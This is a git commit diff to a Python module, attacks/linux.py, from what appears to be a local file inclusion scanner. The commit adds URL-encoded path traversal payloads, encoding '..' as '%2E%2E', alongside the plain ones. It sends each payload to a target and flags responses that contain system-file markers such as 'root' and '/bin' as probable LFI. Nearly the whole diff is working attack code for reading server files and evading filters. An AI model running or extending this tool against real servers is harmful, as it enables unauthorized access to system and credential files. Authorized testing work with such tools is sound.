4c2e8998aaa5c973a02f2074375babebb60d0716
Mike Mulchrone <mikemulchrone987@gmail.com>
2025-03-22 22:01:42 -0400

    url encode

--- attacks/linux.py
+++ attacks/linux.py
@@ -1,4 +1,5 @@
 import requests
+import urllib.parse
 from banner.banner import END, GREEN_NORMAL
 
 class LinuxLFI:
@@ -6,6 +7,7 @@ class LinuxLFI:
         for path in file_paths:
             path = path.replace("\n", "")
             print("=" * 60)
+
             if parse.walkcount:
                 count = int(parse.walkcount)
                 for i in range(count):
@@ -13,8 +15,18 @@ class LinuxLFI:
                         path = ".." + path
                     else:
                         path = "../" + path
-                print("Payload: {}".format(path))
+
+                print("Normal Payload: {}".format(path))
                 query = requests.get(parse.target+path)
                 if 'root' and 'bash' and '/bin' in query.text:
                     print("{}Probable LFI: {}{}".format(GREEN_NORMAL,parse.target+path,END))
+
+                url_encoded_path = urllib.parse.quote(path, encoding='utf-8', safe='')
+                url_encoded_path = url_encoded_path.replace("..", "%2E%2E")
+                print("URL Encoded Payload: {}".format(url_encoded_path))
+                # Send the URL encoded request
+                query = requests.get(parse.target+url_encoded_path)
+                if 'root' in query.text and 'bash' in query.text and '/bin' in query.text:
+                    print("{}Probable LFI: {}{}".format(GREEN_NORMAL, parse.target + url_encoded_path, END))
+                
         print("=" * 60,"\n")
